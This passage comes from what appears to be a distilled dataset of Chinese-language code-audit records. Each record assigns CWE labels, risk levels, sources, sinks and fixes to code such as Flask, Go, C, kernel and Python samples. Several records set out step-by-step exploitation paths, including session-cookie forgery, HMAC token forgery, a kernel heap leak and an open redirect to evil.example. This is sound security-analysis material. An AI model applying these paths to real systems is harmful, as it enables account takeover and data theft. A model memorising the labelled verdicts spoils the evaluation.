+line 46-47: target_str = str(target_user_id) / if not target_str.startswith('user_') —— 防御核验（次要不完整校验）：该前缀检查不规范化路径，user_../../x 可通过；line 72 export_file = f"/exports/user_{target_user_id}_data.csv" 将其拼入文件路径，存在 CWE-22 式的路径逃逸面。但要抵达 line 72 还需同时满足 line 55 授权（管理员或本人）且 line 62-65 的参数化查询在 user_profiles 中命中含 ../ 的 user_id 记录（否则 line 68-69 返回 404），在本文件内无法证明该数据前提成立，故仅作次要弱点记录，不作为主判定。
+最小利用路径：读取源码获得 line 8 密钥 → 用 Flask session 序列化格式伪造 {'user_id': <任一管理员id>} 并签名 → POST /api/export 携带任意合法 user_id → 越过 line 55 授权导出任意用户 PII（line 75 user_data['username'],user_data['email'],user_data['phone']），line 79 还回显导出路径。
+互斥锚句：非 CWE-321，因为该密钥不是用于保护业务数据的加密密钥，而是直接充当会话认证凭据（签名即身份证明），语义上属硬编码凭据；非 CWE-89，因为 line 23-25 与 line 62-64 均为占位符参数化查询；非 CWE-22 主判，因为路径逃逸的可达性依赖样本外数据前提（见上），而 session 伪造链在本文件内完整可达。
+has_vulnerability: true
+vulnerability_type: CWE-798 Use of Hard-coded Credentials
+risk_level: Critical
+source: line 8: 硬编码的 Flask 会话签名密钥字面量 'super-secret-key-2024'
+sink: line 19: session.get('user_id') 信任以该密钥签名的 cookie，决定 line 52-55 的授权结果
+explanation: 硬编码会话密钥使攻击者可离线伪造任意用户（含管理员）的签名 cookie，完整绕过 line 55 的本人/管理员授权门导出任意用户数据；非 CWE-321，因为该密钥直接用于身份认证签名而非业务数据加密。
+fix_suggestion: line 8 改为从环境变量/密管服务注入密钥（如 app.secret_key = os.environ['SESSION_SECRET']）并轮换现有密钥、强制全部会话失效；line 46-47 增加对 target_str 的字符白名单（如仅 ^user_[A-Za-z0-9]+）或 os.path.normpath 后校验仍位于 /exports/ 前缀内，消除 line 72 的路径逃逸面。
+
+redistill-line-4848
+分析过程:
+line 47: if !verifyToken(payload, "gateway-secret-key") —— HMAC 认证密钥以字面量硬编码在源码中，任何获得源码/二进制的人都能提取。
+line 29-36: mac.Write([]byte(payload.Command)) … hmac.Equal(expectedMAC, receivedMAC) —— 防御核验（HMAC 校验本身）：算法实现正确，使用常数时间比较 hmac.Equal，无长度旁路；但信任根（密钥）已泄露，攻击者可对任意 Command 自算合法 Token，该防线对知情攻击者无效。
+line 53: if !allowedCommands[payload.Command] —— 防御核验（白名单）：map 精确字符串匹配（line 21-25 仅 status/version/health 三项），无通配、无前缀匹配、无大小写折叠，伪造 token 后仍只能让这三个固定字符串通过，白名单有效。
+line 60: cmd := exec.Command("gateway-cli", payload.Command) —— 防御核验（执行方式）：Go 的 exec.Command 以 argv 向量直接 execve，不经 shell，元字符（;、|、()）不会被解释；且到达此处的 payload.Command 已被 line 53 收敛为三个固定字面量之一，命令名固定、参数位也固定，无注入面。
+最小利用路径：提取 line 47 密钥 → 对 Command="version" 计算 HMAC-SHA256 并 base64 → POST /api/v1/operation → 未授权获得 gateway-cli status/version/health 的输出（line 68 w.Write(output)）。影响止于这三条只读命令的信息暴露，无 RCE、无任意命令。
+互斥锚句：非 CWE-78，因为 line 60 无 shell 层且 line 53 白名单将参数收敛为固定字面量，注入目标（OS 命令）不可达；非 CWE-88，因为不存在用户可控数据落入参数位的路径（白名单先行拦截）；非 CWE-347，因为签名验证逻辑本身存在且正确实现，问题是密钥硬编码而非验证缺失。
+has_vulnerability: true
+vulnerability_type: CWE-798 Use of Hard-coded Credentials
+risk_level: Low
+source: line 47: 硬编码 HMAC 密钥字面量 "gateway-secret-key"
+sink: line 47: verifyToken(payload, "gateway-secret-key") 以该密钥作为 API 唯一认证凭据
+explanation: 硬编码 HMAC 密钥可被提取并伪造合法 Token 绕过 line 47 认证，但 line 53 的精确白名单与 line 60 的无 shell argv 执行将后果限制为三条只读命令输出的未授权暴露；非 CWE-78，因为命令名固定且无 shell 解释层。
+fix_suggestion: line 47 改为从环境变量或密钥管理服务读取 HMAC 密钥（如 os.Getenv("GATEWAY_HMAC_SECRET")）并轮换现密钥；可追加加固：为 Token 绑定时间戳/nonce 以防重放。
+
+redistill-line-5119
+分析过程:
+line 10-25: create_buffer —— 防御核验：line 11 if (size == 0) 拒绝零长；line 15、line 19 对两次 malloc 均判空且失败路径 line 20 free(buf) 正确回滚，分配器无缺陷。
+line 43-47: size_t input_len = strlen(input); / if (input_len >= buf->size) / memcpy(buf->data, input, input_len + 1) —— 防御核验（边界检查）：通过检查时 input_len <= buf->size - 1，故 input_len + 1 <= buf->size，拷贝含 '0' 恰好不越界，且 size_t 比较无符号截断问题，该防御有效（非 CWE-120/CWE-190）。
+line 27-37: destroy_buffer —— 防御核验（置 NULL 策略）：line 33 buf->data = NULL 只能防"结构体存活时 data 悬垂"，但函数按值接收指针，line 36 free(buf) 之后调用方变量并未被置 NULL，注释宣称的保护不成立。
+line 57: destroy_buffer(buf); —— 第一次调用，释放 buf->data（line 32）与 buf 本身（line 36），此后 buf 成为悬垂指针（值非 NULL）。
+line 58: destroy_buffer(buf); —— 第二次调用：line 28 if (!buf) 检查对悬垂但非 NULL 的指针判定失败（防御无效，作用位置错误——置 NULL 发生在被释放对象内部而非调用方指针上）；line 31 读取已释放内存 buf->data（UAF 读，结果未定义：若堆块已被复用为非 NULL 垃圾值则 line 32 free(垃圾指针) 直接堆损坏）；无论 line 31 结果如何，line 36 free(buf) 对同一指针第二次执行，构成确定性双重释放。行内注释"重复释放测试（安全）"与代码事实矛盾。
+最小利用路径：无需外部输入，程序按 line 57→line 58 顺序执行即必然触发；glibc tcache 对同指针双 free 会检测并 abort（DoS），若两次 free 之间堆块被复用（本文件内 line 58 前无其他分配，复现依赖运行时堆状态），则可能升级为任意写原语。本文件内输入全部硬编码（line 56 "test input"），无攻击者可控数据进入该链路。
+互斥锚句：非 CWE-416 主判，因为 line 31 的 UAF 读只是伴随现象，确定性后果是 line 36 对同一指针的第二次 free（CWE-415）；非 CWE-122/CWE-787，因为 line 44 的边界检查已证明 memcpy 不越界。
+has_vulnerability: true
+vulnerability_type: CWE-415 Double Free
+risk_level: Medium
+source: line 57: 第一次 destroy_buffer(buf) 释放后调用方指针未置 NULL，成为悬垂指针
+sink: line 58: 第二次 destroy_buffer(buf) 经 line 36 free(buf) 对同一指针重复释放
+explanation: destroy_buffer 按值收指针且 line 36 无条件 free(buf)，line 58 的二次调用必然对同一堆块重复 free，注释宣称的"置NULL防重复释放"（line 33）作用位置错误、无法阻止；非 CWE-416 主判，因为 UAF 读（line 31）只是伴随，确定性后果是双重释放。
+fix_suggestion: line 27 将签名改为 void destroy_buffer(Buffer **bufp)，在 line 36 之后执行 *bufp = NULL，并让 line 57-58 传 &buf；或在 main 中 line 57 后手动 buf = NULL 并删除 line 58 的二次调用。
+
+redistill-line-61
+分析过程:
+line 3: #incoude <linux/slab.h> —— 拼写损毁的 include 行，按预处理指令语义视为引入 slab 分配器声明，不影响安全判定。
+入口枚举：唯一外部入口是 ioctl 处理函数 line 17 device_ioctl(file, cmd, arg)（设备节点对本地用户开放，arg 为用户态指针）；模块加载/卸载（line 46、line 56）为 root 特权路径，非攻击面。
+line 21 / line 42: mutex_lock(&lock) … mutex_unlock(&lock) —— 防御核验（并发）：IOCTL_FREE（line 24-29）与 IOCTL_USE（line 31-35）的全部读写都在同一互斥临界区内，两 ioctl 之间不存在 TOCTOU 竞态。
+line 25-27: if (buf_allocated) { kfree(kernel_buf); buf_allocated = 0; } —— 防御核验（双重释放）：标志位先清后释且受 mutex 保护，重复 IOCTL_FREE 第二次因 line 25 判 0 而跳过，双 free 防御有效。
+line 32-33: if (buf_allocated) { copy_to_user((void __user *)arg, kernel_buf, 128); } —— 防御核验（释放后使用）：free 后 buf_allocated=0，后续 IOCTL_USE 被 line 32 拦截，UAF 防御有效；copy_to_user 自身处理用户指针合法性。
+line 49: kernel_buf = kmalloc(128, GFP_KERNEL); —— 缺陷点：kmalloc 不清零内存，且从 line 46-54 到 line 33 之间全文件无任何对 kernel_buf 的写入（无 memset、无 copy_from_user 填充），缓冲区携带前序 slab 对象的残留数据。
+逐跳链：line 49 分配未初始化堆块 → line 52 buf_allocated = 1 打开使用门 → 任意本地用户发 IOCTL_USE → line 33 copy_to_user(arg, kernel_buf, 128) 将 128 字节未初始化内核堆内容（可能含内核指针、其他子系统的凭据/密钥残留）拷入用户可控缓冲。
+最小利用路径：本地进程 open 设备 → ioctl(fd, IOCTL_USE, buf) → 读取 buf 即得内核堆残留；反复触发 IOCTL_FREE 后由其他分配占用再……不可行（free 后 flag 拦截 USE），但单次即可泄露当前 128 字节残留，可辅助 KASLR 绕过或拾取敏感数据。
+互斥锚句：非 CWE-416/CWE-415，因为 line 21-42 的互斥锁加 buf_allocated 标志（line 25、line 32）已双向核验有效，free 后无使用、无重复释放路径；非 CWE-125（内核越界读），因为 line 33 拷贝长度 128 恰等于 line 49 分配长度，未越界。
+has_vulnerability: true
+vulnerability_type: CWE-200 Exposure of Sensitive Information to an Unauthorized Actor
+risk_level: Medium
+source: line 17: 本地用户经 ioctl IOCTL_USE 命令触发（line 31），arg 为用户态接收缓冲
+sink: line 33: copy_to_user((void __user *)arg, kernel_buf, 128) 将 line 49 kmalloc 得到且从未初始化的 128 字节内核堆残留拷贝到用户态
+explanation: kmalloc(128, GFP_KERNEL) 不清零且全文件无写入，IOCTL_USE 把携带前序 slab 残留数据的缓冲区原样交给任意本地调用者，构成内核堆信息泄露；非 CWE-416，因为 buf_allocated 标志与互斥锁（line 21-42）已有效阻断 free 后使用与双重释放。
+fix_suggestion: line 49 改用 kzalloc(128, GFP_KERNEL)（或在分配后 memset(kernel_buf, 0, 128)），确保 copy_to_user（line 33）不会带出未初始化堆内容；可追加加固：line 33 检查 copy_to_user 返回值并在失败时返回 -EFAULT。
+
+redistill-line-7377
+分析过程:
+入口枚举：本文件不含任何 HTTP handler 或外部输入解析逻辑。line 110 http_server.listen(self.options.web_port, self.options.web_host) 的监听地址、line 107 max_buffer_size=2**32 的缓冲上限均来自 self.options（mitmproxy 操作员配置对象，line 44 self.options.changed.connect(...) 亦为配置变更回调）——配置属操作员信任输入，本文件内无证据表明其可被远程攻击者控制。
+line 60-99: 各sig* 回调把 view/events/options/servers 状态经 app.ClientConnection.broadcast(...) 推给已连接的 Web 客户端——防御核验：数据源是本地代理状态（app.flow_to_json(flow)、optmanager.dump_dicts(...)），序列化为 JSON 后经 WebSocket 广播；客户端连接的准入/鉴权逻辑位于 app 模块（line 19 导入），不在本文件内，属样本外假设，无法据此判定鉴权缺失。
+line 26-28: class Application(app.Application) 子类仅原样转发 super().init(master, debug)，无行为差异、无注入面。
+line 114-115: message += f" 后接原始换行再接 Try specifying a different port... —— 单引号 f-string 内出现裸换行，若文件确为此内容则构成 Python 语法错误（构建期失败，非运行时安全问题）；该字符串仅在 line 116 raise OSError(...) 的异常消息中使用，不进入任何执行/渲染 sink。
+line 107: max_buffer_size=2**32（4GB）——防御核验（资源配置）：上限极大，理论上允许单请求占用大缓冲；但是否实际可被远程触发取决于 self.app 路由是否接收大 body（样本外），且 line 105 注释表明是有意为之，本文件内不构成可证明的资源耗尽链。
+结论：文件内不存在任何"外部可控 source → 危险 sink"的完整证据链，所有敏感参数（监听地址、缓冲上限）源自操作员配置，广播数据的鉴权边界在样本外模块。
+互斥锚句：非 CWE-798/CWE-352/CWE-79，因为本文件既无凭证字面量、也无状态变更端点或浏览器渲染逻辑可供判定。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 本文件为 Web 控制台的装配与状态广播骨架，监听地址/缓冲上限均出自操作员配置（line 107、line 110），广播准入逻辑在样本外的 app 模块，文件内无外部可控 source 到危险 sink 的证据链；非 CWE-79/CWE-352，因为不存在渲染上下文或状态变更端点。
+fix_suggestion: no fix needed（加固建议：line 114-115 的 f-string 含裸换行，若为真实文件内容应改为 n 转义以消除语法错误；line 107 的 4GB 缓冲上限建议按业务实际需要收敛并在 app 模块确认客户端鉴权。）
+
+redistill-line-7435
+分析过程:
+入口枚举：与同批另一 mitmproxy 样本独立核对——本文件同样不含 HTTP handler 或外部输入解析。line 105 http_server.listen(self.options.web_port, self.options.web_host) 与 line 102 max_buffer_size=2**32 均由操作员配置对象 self.options 驱动（line 27 构造注入），文件内无远程可控来源。
+line 55-94: _sig_view_add 至 _sig_servers_changed 各回调将本地代理状态经 app.ClientConnection.broadcast(...) JSON 序列化广播——防御核验：数据源为 app.flow_to_json(flow)（line 57）、app.logentry_to_json(entry)（line 73）、optmanager.dump_dicts(...)（line 80）等本地状态转换函数，实现均在样本外 app/optmanager 模块；WebSocket 客户端的鉴权/准入同样位于 app 模块（line 18 导入），本文件内无法证明存在未授权接收方。
+line 51: self.app = app.Application(self, self.options.web_debug) —— 直接实例化 app.Application，无子类包装、无额外攻击面。
+line 109: message += f"nTry specifying a different port..." —— n 为合法转义，字符串仅用于 line 110 raise OSError(...) 的异常消息，不进入执行/渲染 sink。
+结论：文件内不存在"外部可控 source → 危险 sink"的完整证据链；敏感参数（监听地址、debug 开关、缓冲上限）全部来自操作员配置。
+互斥锚句：非 CWE-915/CWE-79，因为广播 payload（line 89-93）的键 s.mode.full_spec 源自本地服务器对象而非用户可控动态键，且本文件无浏览器渲染上下文。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 本文件是 WebMaster 装配与状态广播骨架，监听地址与缓冲上限出自操作员配置（line 102、line 105），广播数据的鉴权边界在样本外 app 模块，文件内无外部可控 source 到危险 sink 的证据链；非 CWE-915，因为 line 91 的动态键 s.mode.full_spec 来自本地受信对象而非用户输入。
+fix_suggestion: no fix needed（加固建议：line 102 的 4GB max_buffer_size 建议按业务需要收敛，并确认样本外 app 模块对 WebSocket 客户端实施了来源/鉴权校验。）
+
+redistill-line-7463
+分析过程:
+入口枚举：三个导出函数 SHA512_256（line 23）、SHA512_256i（line 57）、SHA512_256iOne（line 93）接收调用方传入的字节串/大整数并输出哈希，无 I/O、无命令、无查询 sink；安全属性 = 编码的单射性（抗多输入拼接碰撞）与哈希算法强度。
+line 25: state := crypto.SHA512_256.New() —— 防御核验（算法）：SHA-512/256 为截断 SHA-512，初始 IV 独立，天然免疫长度扩展（line 21 注释与算法事实一致），非弱哈希（非 CWE-327/328）。
+line 32-35: inLenBz := make([]byte, 64/8) / binary.LittleEndian.PutUint64(inLenBz, uint64(inLen)) —— 防御核验（段数前缀）：8 字节小端段数前缀置于数据头（line 40），不同段数的输入元组首 8 字节必不同，跨段数碰撞被阻断。
+line 41-46: data = append(data, bz...) → data = append(data, hashInputDelimiter) → l := []byte(strconv.Itoa(len(bz))); data = append(data, l...) —— 防御核验（域分隔）：每段后追加  分隔符再加该段十进制长度。单射性论证：设同一字符串存在两个合法尾段解析，尾段 dA 起点 pA=val(dA)、dB 起点 pB=val(dB) 且 pB>pA，则 dA 由更多前导数字拼接 dB 构成且 strconv.Itoa 无前导零，必有 val(dA)>val(dB)，与 pA<pB 矛盾——解析唯一，编码单射，"不同输入元组同 data"的构造性碰撞（CWE-328 式拼接歧义）被有效关闭；仅用  分隔而无长度后缀的旧式拼接才可被 ["a","b"] vs ["a","b"] 类构造碰撞，本代码已含长度后缀，不属该族。
+line 69-82: SHA512_256i 采用同构编码，且 line 72 ptrs[i] = append(n.Bytes(), byte(n.Sign())) 以"幅值字节+符号位"规范化大整数（Bytes() 无前导零），负数/正数同幅值不会同编码，单射性同上成立。
+line 96-99: SHA512_256iOne —— 防御核验：line 96 判 nil；line 99 data = append(in.Bytes(), byte(in.Sign())) 对单个大整数是规范编码（幅值+符号唯一决定整数），单输入场景无拼接歧义。跨函数域（iOne 无前缀 vs 多输入带 8 字节段数前缀）理论上未加函数级 tag，但各函数在协议中用途固定，文件内无可证明的跨函数碰撞利用路径（待查证：协议层是否存在将 iOne 输出与多输入输出置于同一比较域的调用点——该调用点不在本文件内，属样本外，不作判定依据）。
+line 50-53 / line 86-89 / line 102-105: state.Write(data) 错误处理 —— hash.Hash.Write 文档保证不返回错误，防御性分支无害。
+利用可行性：无——构造两组不同输入得到相同 data 需要破坏上述单射编码或直接碰撞 SHA-512/256，均不可行。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 三处哈希均先做规范化编码——8 字节段数前缀（line 35）+ 每段  分隔符 + 十进制长度后缀（line 43-45、line 79-81）——该编码可证单射，配合抗长度扩展的 SHA-512/256（line 25），拼接碰撞与弱算法两条路径均被关闭；非 CWE-328，因为不存在可构造歧义的裸拼接。
+fix_suggestion: no fix needed（加固建议：若协议中存在跨函数比较哈希输出的场景，可为 line 23/57/93 三个函数各加一个固定的函数级域标签前缀，彻底消除跨函数编码域重叠的理论空间。）
+
+redistill-line-7470
+分析过程:
+入口枚举：本文件唯一外部数据入口是 Source 对象上的 getResourceName()（line 51-52）与 getFullResourceName()（line 54），二者由 Smarty 框架在 fetch()/display() 调用点填充；模板名是否最终来自终端用户输入，取决于宿主应用调用方式，属样本外假设，本文件内无法证明攻击者可控。
+line 51-55: if (strpos(source->getResourceName(), '://') !== false) { filepath = source->getResourceName(); } else { filepath = str_replace(':', '://', source->getFullResourceName()); } —— 防御核验：无任何流包装器白名单、无字符校验、无路径规范化；资源名被原样（或仅做 :→:// 替换）转为流 URL。该"无校验"是事实，但其风险成立以资源名可控为前提（见上，样本外）。
+line 59: fp = fopen(filepath, 'r+') —— 以读写模式打开任意解析出的流；line 58 注释声明流可用性已在上游 Base::fetch() 检查，本文件内未见该检查，属样本外防御，不作依据。文件本身仅执行读（line 61-62 fgets 循环），'r+' 模式未产生写操作。
+line 38-39: source->content = this->getContent(source); source->timestamp = source->exists = !!source->content; —— 读回内容作为模板源码，由父类 RecompiledPlugin（line 26，样本外）走编译-执行管线；即"资源名 → 流内容 → 模板源码"的链路在结构上存在，但触发端（谁提供资源名）不在文件内。
+line 61-62: while (!feof(fp) && (current_line = fgets(fp)) !== false) { t .= current_line; } —— 循环条件完备，无死循环/截断缺陷；line 64 fclose(fp) 正确释放句柄，失败分支 line 67 返回 false 由 line 39 转为 exists=false，无未处理异常路径。
+利用可行性：文件内不可证明——缺少"攻击者控制模板资源名"这一必要前提；若该前提在宿主应用中成立（样本外假设），stream:/含 :// 的资源名可指向任意流并使流内容被当作模板编译，构成模板注入/SSRF 面，但该结论不能由本文件独立支撑。
+互斥锚句：不判 CWE-1336，因为模板源码位的输入（资源名）可控性属样本外假设，文件内 source→sink 链不完整；不判 CWE-22/CWE-73，因为 $filepath 是流 URL 而非文件系统路径拼接，且无证据表明其外部可控；不判 CWE-918，理由同前（目的地可控性未证明）。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: getContent 将资源名不加校验地转为流 URL 并 fopen 读取（line 51-59），读回内容进入模板编译链（line 38），但资源名是否攻击者可控取决于宿主应用的 fetch() 调用点（样本外假设），文件内 source→sink 证据链不完整，故不判漏洞；非 CWE-1336，因为模板源码位输入的可控性无法由本文件证明。
+fix_suggestion: no fix needed（加固建议：line 51-55 可增加流包装器白名单（仅允许应用注册的 stream:// 目标）并拒绝含 ../、:// 指向网络协议的資源名；line 59 的 'r+' 建议改为 'r'，遵循最小权限避免意外写能力。）
+
+##### redistill-line-7472
+分析过程: 逐跳核验（traefik ReplacePathRegex 中间件，非 HTTP 入口=config，HTTP 入口=请求路径）。
+line 30: func New(ctx context.Context, next http.Handler, config dynamic.ReplacePathRegex, name string) —— 正则与替换串来自动态配置（operator 控制，非请求方控制）；line 33: exp, err := regexp.Compile(strings.TrimSpace(config.Regex)) —— Go regexp 为 RE2 引擎，无回溯爆炸，配置侧恶意正则不构成 ReDoS；编译失败在 line 34-36 直接返回错误，不进入服务。
+line 51: currentPath := req.URL.RawPath，line 53: currentPath = req.URL.EscapedPath() —— 攻击者可控的请求路径入口。
+line 58: req.URL.RawPath = rp.regexp.ReplaceAllString(currentPath, rp.replacement) —— 攻击者路径内容（含捕获组）进入改写后的 RawPath。
+line 64: req.URL.Path, err = url.PathUnescape(req.URL.RawPath) 与 line 71: req.RequestURI = req.URL.RequestURI() —— 防御核验：三字段（RawPath/Path/RequestURI）在改写后保持单编码语义一致（Path 是 RawPath 的恰好一次解码，RequestURI 按 EscapedPath 规则优先回带 RawPath），关闭了历史缺陷"改写后 Path/RequestURI 与 RawPath 不同步导致下游看到旧路径"的攻击面；解码失败在 line 65-68 以 500 拒绝，不放行畸形路径。
+line 60-62 注释自证残留边界：Doesn't handle multiple times encoded replacement (/ => %2F => %252F => ...) —— 多次编码（%252F）只做一次解码，二次解码发生在后端时会产生 Path 与后端实际所见不一致。该场景成立前提是后端存在非标准双重解码行为，属样本外假设，不作为本样本结论依据。
+line 57: req.Header.Add(replacepath.ReplacedPathHeader, currentPath) —— 原路径经专用头传给后端，头值经 Go net/http 序列化校验（非法字符请求会被服务器层拒绝），无头注入面。
+最小利用路径核验：攻击者无法控制正则与替换串（配置面）；能控制的仅是被替换进新路径的内容，而该内容始终处于 URL 路径编码语义内且三字段同步，本样本内无独立可利用 sink。待查证：下游后端若依赖 X-Replaced-Path 做鉴权时的双重解码差异属部署组合问题。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 配置侧正则（RE2，无 ReDoS）+ 请求路径改写后 RawPath/Path/RequestURI 三字段同步（line 58→64→71）构成完整防御链，单次编码语义内无路径差分可利用；非 CWE-22 因为改写产物未在本样本内逃逸出 URL 编码语义被独立消费，残留的多重编码边界（line 62 注释）依赖后端双重解码这一样本外假设。
+fix_suggestion: no fix needed；加固建议：在 line 64 解码后增加对 RawPath 中 %2F/%252F 序列的显式策略（拒绝或强制归一），消除 line 62 注释承认的多重编码边界。
+
+redistill-line-7662
+分析过程: 逐跳核验（目标函数 _generate_redirect_uri，切片自带行号 192-216；入口=HTTP 查询参数）。
+line 193-195: if "_target_url" in request.query_params: → target = request.query_params["_target_url"] —— 攻击者完全可控的绝对/相对 URL 原样进入 target，注释 # if _target_url already in query params => respect it 表明无任何校验意图。
+line 198: 未提供该参数时 target = "/?" + urllib.parse.urlencode(request.query_params) —— 分支本身产出相对路径，安全；但 line 193 分支可完全旁路它。
+防御逐段核验：全函数对 target 无 scheme 白名单、无 host 校验、无"必须以 / 开头"的相对路径断言——不存在任何防御点；line 202-207 对 SPACE_HOST（环境变量，可信源）的 split 处理与攻击面无关。
+line 208: redirect_uri = f"https://{space_host}/login/callback?{urllib.parse.urlencode({'_target_url': target})}" 与 line 212-214: request.url_for("oauth_redirect_callback").include_query_params(_target_url=target) —— 未校验的 target 被编入 OAuth redirect_uri 查询参数并返回；调用点证据 L98: redirect_uri = _generate_redirect_uri(request) 确认其进入登录跳转流程。
+sink 说明：最终浏览器 302 到 _target_url 发生在回调处理器（不在本切片内，标注为样本外假设：callback 将 _target_url 作为跳转目标）；但校验缺失这一根因完整落在本函数内——它是 redirect_uri 的唯一构造关口且明示"respect it"。
+最小利用路径：受害者访问 https://<app>/login?_target_url=https://evil.example，完成 OAuth 登录后被重定向至 evil.example，用于钓鱼/凭据诱骗（授权码本身仍回到固定的 /login/callback，不随 target 外泄）。
+互斥锚句：非 CWE-918 SSRF 因为服务器不向 target 发起取回请求，跳转的是用户浏览器；非 CWE-79 因为无 HTML 上下文注入，是 Location 层跳转；非 CWE-22 因为不涉及文件系统路径。
+has_vulnerability: true
+vulnerability_type: CWE-601 URL Redirection to Untrusted Site ('Open Redirect')
+risk_level: Medium
+source: line 195: target = request.query_params["_target_url"]（HTTP 查询参数，完全用户可控）
+sink: line 208/212-214: 未校验的 target 被编入 OAuth redirect_uri（urlencode({'_target_url': target}) / include_query_params(_target_url=target)）并经 L98 进入登录跳转链
+explanation: 用户在查询参数 _target_url 提供任意外部 URL → 函数无 scheme/host/相对路径校验直接将其编入 OAuth redirect_uri 并透传给登录回调跳转链 → 登录完成后浏览器被重定向到攻击者站点；非 CWE-918 因为服务器自身不请求该 URL。
+fix_suggestion: line 195 后增加校验：仅接受相对路径（如 if not target.startswith("/") or target.startswith("//"): target = "/"），或对照同 host 白名单校验 urlparse(target).netloc；同时移除 line 203/207/209 的 print 调试输出避免敏感 URL 进入 stdout 日志。
+
+redistill-line-7730
+分析过程: 全入口枚举：不可信输入=ELF 文件与 raw BTF blob（LoadSpec/LoadSpecFromReader/LoadSplitSpecFromReader，文件流入口）；无 HTTP 入口。逐段核验解析防御链。
+line 55: func LoadSpec(file string) (*Spec, error) 与 line 66: func LoadSpecFromReader(rd io.ReaderAt) —— 不可信 ELF/raw 数据入口；line 67: internal.NewSafeELFFile(rd) 表明 ELF 解析走带保护的包装（包装实现不在样本内，标注样本外假设：其自身做 header 健壮性校验）。
+loadRawSpec 边界检查链：line 218: if header.HdrLen > uint32(len(btf)) → 拒绝头越界；line 221: btf = btf[header.HdrLen:] 在检查之后切片，安全。
+line 223: if uint64(header.StringOff)+uint64(header.StringLen) > uint64(len(btf)) —— 防御核验：StringOff/StringLen 为 u32，先提升 uint64 再相加，消除整数回绕绕过（若用 uint32 相加，Off=0xFFFFFFF0+Len=0x20 回绕为 0 可绕过检查）；检查有效。line 226 切片在检查后执行。
+line 231: if uint64(header.TypeOff)+uint64(header.TypeLen) > uint64(len(btf)) —— 同样的 uint64 提升模式，types 段切片 line 234 受保护。
+symbolOffsets：line 120-123: if idx := sym.Section; idx >= elf.SHN_LORESERVE && idx <= elf.SHN_HIRESERVE { continue } 排除保留段号；line 125-128: if sym.Value > math.MaxUint32 { continue } 在 line 136 uint32(sym.Value) 截断前先行排除，截断不可达；line 130-132: if int(sym.Section) >= len(file.Sections) 拒绝越界段索引后才在 line 135 取 file.Sections[sym.Section].Name。
+loadSpecFromELF：line 154-156: if sec.Size > math.MaxUint32 先于 line 159 uint32(sec.Size) 截断检查；line 165-167 无 .BTF 段返回 ErrNotFound；line 178-180 字节序一致性校验。
+残留核验（均非可利用漏洞）：fixupDatasec line 291 .kconfig 分支的 vsi.Type.Var).Linkage = GlobalVar 为无保护类型断言，但其前置 line 277 fixupDatasecLayout(ds) 已对每个成员执行带 ok 的断言（line 306-308: v, ok := vsi.Type.(Var)，失败即返错），执行到 line 291 时全部成员必为 *Var，panic 不可达。AnyTypesByName line 389-393 中 types = slices.Delete(types, i, i+1) 后 i++ 会跳过被左移的元素——正确性缺陷（个别名字不匹配类型可能漏删），影响是查询结果多含一个类型，调用方 TypeByName line 448-462 仍按 reflect 类型过滤并检 ErrMultipleMatches，无内存安全后果。fixupDatasecLayout line 313-322 的 uint32(align)/uint32(size) 累加理论上可在总尺寸超 4GiB 时回绕，但构造需数 GB 级类型描述，受内存上限约束，仅记理论缺陷。
+最小利用路径结论：所有对不可信 blob 的切片操作均先经 uint64 提升的边界检查；Go 切片本身带运行时边界保护，最坏为 panic（DoS），而 panic 路径已被前置检查封闭，样本内无 source→sink 可利用链。
+has_vulnerability: false
+vulnerability_type: none
+risk_level: None
+source: N/A
+sink: N/A
+explanation: 不可信 ELF/BTF 输入的每个切片点（HdrLen/StringOff+StringLen/TypeOff+TypeLen、段索引、u32 截断）之前都有 uint64 提升或显式上界检查，防御链完整无回绕旁路；非 CWE-190 因为所有长度相加均先转 uint64 再比较，u32 回绕不可达；AnyTypesByName 的 slices.Delete 索引跳步仅为查询结果正确性缺陷，无安全影响。
+fix_suggestion: no fix needed；加固建议：AnyTypesByName 中删除元素后改为不自增（types = slices.Delete(types, i, i+1); i-- 或倒序遍历），消除漏删类型的一致性缺陷。
+
+redistill-line-7771
+分析过程: 全入口枚举：入口①=StartAndGC 的 config 字符串（应用配置源，开发者信任边界）；入口②=Get/Put/Delete 的 key（可能承接 HTTP 层数据）；入口③=缓存文件内容（Get 回读的本地文件流）。
+路径面防御核验：line 130-132: m := sha256.New() → io.WriteString(m, key) → keySha256 := hex.EncodeToString(m.Sum(nil)) —— key 经 SHA-256 十六进制化，输出字符集仅 [0-9a-f]，不含路径分隔符；line 137-140 子目录取自 hex 前缀，line 151 filepath.Join(cachePath, fmt.Sprintf("%s%s", keySha256, fc.FileSuffix)) —— 攻击者经 key 无法注入 ../ 或分隔符，CWE-22/73 在 key 路径上不成立（互斥锚：非 CWE-22 因为外部可控 key 被单向哈希后才参与路径拼接）。
+配置面：line 98-99: fc.CachePath = cfg[cpKey]、fc.FileSuffix = cfg[fsKey] 无校验，但 config 来自应用自身配置（可信源），且 DirectoryLevel/EmbedExpiry 经 line 100-108 strconv.Atoi 严格整数化并报错拒绝，非数字输入被防御。
+缺陷链（主结论）：line 145: err = os.MkdirAll(cachePath, os.ModePerm)、line 122: err = os.MkdirAll(fc.CachePath, os.ModePerm)、line 313: return os.WriteFile(filename, content, os.ModePerm) —— os.ModePerm=0777，仅受进程 umask 削减（典型 022 → 目录/文件 0755），缓存文件与目录对同机所有本地用户可读。防御核验：无任何 chmod/掩码控制点，0777 请求值为代码事实；缓存内容经 line 210-222 Put 写入，Data 为 interface{}（line 38: Data interface{}），可承载会话、令牌等敏感对象（beego cache 常见用途），世界可读即构成敏感信息暴露。
